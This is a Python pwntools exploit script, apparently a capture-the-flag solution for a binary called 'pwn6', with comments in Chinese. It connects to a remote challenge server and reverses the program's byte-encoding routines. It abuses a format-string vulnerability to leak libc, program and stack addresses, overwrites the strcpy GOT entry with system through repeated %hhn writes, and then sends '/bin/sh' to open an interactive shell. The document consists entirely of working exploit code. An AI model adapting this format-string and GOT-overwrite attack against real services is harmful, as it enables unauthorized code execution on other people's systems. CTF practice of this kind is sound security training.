from pwn import *
import sys
from LibcSearcher import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['gnome-terminal','-x','sh','-c']

p = remote("114.67.175.224", 19652)

elf=ELF('./pwn6')

#encode2的逆算法
def choice2encode(strarg):
    return b''.join([p8(((ord(i)&0b11)<<6)+((ord(i)&0b11111100)>>2)) for i in strarg])
#encode3的逆算法
def choice3encode(strarg):
    return b''.join([p8(((ord(i)&0b00111111)<<2)+ ((ord(i)&0b11000000)>>6)) for i in strarg])

p.sendlineafter('choice:','1')
p.sendafter('keys?',p8(0))
p.sendafter('encode:','a'*0x148) 

p.sendlineafter('choice:','2')
payload=choice2encode('%55$p%51$p%14$p')
p.sendafter('encode:',payload)
p.recvuntil('0x')   
libc_start_main=int(p.recvuntil('0x',drop=True),16)-240

libc=LibcSearcher("__libc_start_main", libc_start_main)
libc_base=libc_start_main-libc.dump('__libc_start_main')   #libc基址
main_base=int(p.recvuntil('0x',drop=True),16)-0xe5b
stack_addr=int(p.recv(12),16)
success('leak->libc_base' +hex(libc_base))
success('leak->mainbase' +hex(main_base))
success('leak->stack_addr' +hex(stack_addr))
strcpy_got=main_base+elf.got['strcpy']#elf的基地址  
print('strcpyGOT'+hex(strcpy_got))
libc_system=libc_base+libc.dump('system')
print('system'+hex(libc_system))


#格式化字符串，第一步
for i in range(6):
    print('first'+str(i))
    x = 5-i
    off_lowByte=(stack_addr+32+x)&0xff
    p.sendlineafter('choice:','2')
    payload=choice2encode('%'+str(off_lowByte)+'c%14$hhn')
    p.sendafter('encode:',payload)

    value_lowByte = (strcpy_got>>(x*8))&0xff
    p.sendlineafter('choice:','2')
    payload=choice2encode('%'+str(value_lowByte)+'c%50$hhn')
    p.sendafter('encode:',payload)
  
#格式化字符串，第二步
for i in range(6):
    print('second'+str(i))
    off_lowByte=(strcpy_got+i)&0xff
    p.sendlineafter('choice:','2')
    payload=choice2encode('%'+str(off_lowByte)+'c%50$hhn')
    p.sendafter('encode:',payload)
  
    value_lowByte = (libc_system>>(i*8))&0xff
    p.sendlineafter('choice:','2')
    payload=choice2encode('%'+str(value_lowByte)+'c%54$hhn')
    p.sendafter('encode:',payload)

#执行system('/bin/sh')
p.sendlineafter('choice:','3')
p.sendafter('encode:',choice3encode('/bin/sh\x00'))
p.interactive()